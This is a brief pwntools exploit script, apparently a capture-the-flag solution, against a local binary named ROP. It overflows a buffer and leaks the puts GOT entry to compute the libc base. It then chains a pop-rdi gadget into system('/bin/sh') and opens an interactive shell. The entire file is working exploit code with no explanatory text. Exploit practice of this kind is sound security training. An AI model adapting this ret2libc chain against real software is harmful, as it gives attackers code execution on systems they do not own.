from pwn import *

#context.log_level = "debug"

p = process('./ROP')
e = ELF('./ROP')
l = e.libc

prdi = 0x00000000004006f3

payload = 'A'*0x78
payload += p64(prdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['main'])

p.sendlineafter(':', payload)

pgot = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')

base = pgot - l.symbols['puts']
binsh = base + l.search('/bin/sh').next()
system = base + l.symbols['system']
print hex(base)

payload = 'A'*0x78
payload += p64(prdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()
